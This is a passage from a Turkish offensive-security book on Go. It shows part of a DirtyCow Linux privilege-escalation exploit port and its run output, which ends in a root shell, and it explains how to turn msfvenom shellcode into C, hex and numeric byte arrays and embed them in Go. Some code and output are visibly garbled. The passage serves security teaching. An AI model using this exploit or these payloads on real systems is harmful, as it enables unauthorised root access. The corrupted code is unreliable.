```go
      mapp,     _ = syscall.Syscall6(
          syscall.SYS_MMAP,
          uintptr(0),
          uintptr (st Size( )) ,
          uintptr ( syscall . PROT_READ),
          uintptr(syscall.MAP_PRIVATE),
          f.Fd(),
          0,

      fmt.Println("Racing, this may take a while..\n")
      go madvise()
      go procselfmem(payload)
      waitForWrite()
```

Liste 9-14: Tam Go portu (`/ch-9/dirtycow/main.go/`)

Zafiyetli hedefinizde kodunuzun çalıştığını doğrulamak için onu çalıştırın. Bir root shell görmekten daha tatmin edici pek az şey vardır.

```bash
alice@ubuntu:-$ go run main.go
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 47092
Racing, this may take a while..

/usr/bin/passwd is overwritten
Popping root shell
procselfmem done
Don't forget to restore /tmp/bak

root@ubuntu:/home/aliceR id
uid=o(root) gid=moo(alice) groups=0(root),4(adm),1000(alice)
```

Gördüğünüz gibi, programın başarılı bir çalıştırması `/usr/bin/passwd` dosyasını yedekler, tanıtıcı (handle) üzerinde kontrol için yarışır, dosya konumunu yeni hedeflenen değerlerle üzerine yazar ve son olarak bir sistem shell’i üretir. Linux `id` komutunun çıktısı, `alice` kullanıcı hesabının `0` değerine yükseltildiğini, yani root seviyesinde ayrıcalığa ulaştığını doğrular.

### Go’da Shellcode Oluşturma

Önceki bölümde, geçerli ELF formatında ham shellcode kullanarak meşru bir dosyayı kötü amaçlı alternatifinizle üzerine yazdınız. Peki bu shellcode’u kendiniz nasıl üretebilirsiniz? Görünen o ki, tipik araç setinizi kullanarak Go dostu shellcode üretebilirsiniz.

Bunu komut satırı aracı `msfvenom` ile nasıl yapacağınızı göstereceğiz, ancak öğreteceğimiz bütünleştirme teknikleri araca özgü değildir. Shellcode veya başka bir şey olsun, harici ikili verilerle çalışmak ve bunları Go kodunuza entegre etmek için birkaç yöntem kullanabilirsiniz. Şundan emin olun: takip eden sayfalar, belirli bir araca özel olmaktan çok, yaygın veri gösterim biçimleriyle ilgilidir.

Metasploit Framework, popüler bir sömürü (exploit) ve sömürü sonrası (post-exploitation) araç seti, `msfvenom` ile birlikte gelir; bu araç, Metasploit’in mevcut yük/faydalı yüklerinden (payload) herhangi birini `-f` argümanı ile belirtilen çeşitli formatlara dönüştürür. Ne yazık ki, açık bir Go dönüştürmesi yoktur. Ancak, küçük uyarlamalarla birkaç formatı Go kodunuza oldukça kolay bir şekilde entegre edebilirsiniz. Burada bu formatlardan beşini inceleyeceğiz: `C`, `hex`, `num`, `raw` ve `Base64`. Nihai hedefimizin Go’da bir byte slice oluşturmak olduğunu aklınızda tutun.

### C Dönüşümü

Bir C dönüşüm tipi belirtirseniz, `msfvenom` yük/faydalı yükü, doğrudan C koduna yerleştirebileceğiniz bir formatta üretir. Bu, mantıklı ilk seçenek gibi görünebilir; çünkü bu bölümün başlarında C ile Go arasındaki birçok benzerliği detaylandırdık. Ancak, Go kodumuz için en iyi aday değildir. Nedenini görmek için, C formatındaki aşağıdaki örnek çıktıya bakın:

```c
unsigned char buff]
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xce\x64\x8b\x50\x30"
"\x86\x52\x0c\x86\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
--snip--
"\x64\x00";
```

Biz neredeyse tamamen yük/faydalı yükle ilgileniyoruz. Bunu Go dostu hale getirmek için noktalı virgülü kaldırmanız ve satır sonlarını değiştirmeniz gerekir. Bu da, tüm satırların sonuna (son satır hariç) bir `+` ekleyerek her satırı açıkça birleştirmeniz veya tüm satır sonlarını kaldırıp tek, uzun ve kesintisiz bir string üretmeniz gerektiği anlamına gelir. Küçük yükler için bu kabul edilebilir olabilir, ancak daha büyük yükler için bunu elle yapmak zahmetli hale gelir. Kendinizi, çıktıyı temizlemek için `sed` ve `tr` gibi diğer Linux komutlarına başvururken bulacaksınız.

Yük/faydalı yükü temizledikten sonra, bunu bir string olarak elde etmiş olursunuz. Bir byte slice oluşturmak için şuna benzer bir şey yazmanız gerekir:

```go
payload := []byte("\xfc\xe8\x82...");
```

Kötü bir çözüm değil, ama daha iyisini yapabilirsiniz.

### Hex Dönüşümü

Önceki yaklaşımdan daha iyi bir adım olarak, bir hex dönüşümüne bakalım. Bu formatta `msfvenom`, uzun, kesintisiz bir onaltılık karakter dizisi üretir:

```text
fce8820000006089e531c0648b50308b520c8b521481072280fb74a2631ff...6400
```

Bu format tanıdık görünüyorsa, bunun nedeni Java deserialization exploit’ini port ederken kullanmış olmanızdır. Bu değeri, `hex.DecodeString()` çağrısına bir string olarak iletmiştiniz. Bu fonksiyon, bir byte slice ve varsa hata ayrıntılarını döndürür. Şöyle kullanabilirsiniz:

```go
payload, err := hex.DecodeString("fce882000000e088e881c06e8b808086820c8b82148b
72280fWa2631ff...600)
```

Bunu Go’ya çevirmek oldukça basittir. Tek yapmanız gereken, string’inizi çift tırnak içine almak ve fonksiyona iletmektir. Ancak büyük bir yük/faydalı yük, satırlara taşan veya önerilen sayfa kenar boşluklarını aşan, estetik açıdan hoş olmayan bir string üretebilir. Yine de bu formatı kullanmak isteyebilirsiniz, fakat kodunuzun hem işlevsel hem de göze hoş görünmesini istiyorsanız üçüncü bir alternatif sunduk.

### Num Dönüşümü

`num` dönüşümü, sayısal, onaltılık formatta, virgülle ayrılmış byte listesini üretir:

```text
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,
0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
--snip--
0x64, 0x00
```

Bu çıktıyı, doğrudan bir byte slice’ı ilklendirmek için şöyle kullanabilirsiniz:

```go
payload := []byte{
    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,
    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
    --snip--
    0x64, 0x00,
}
```
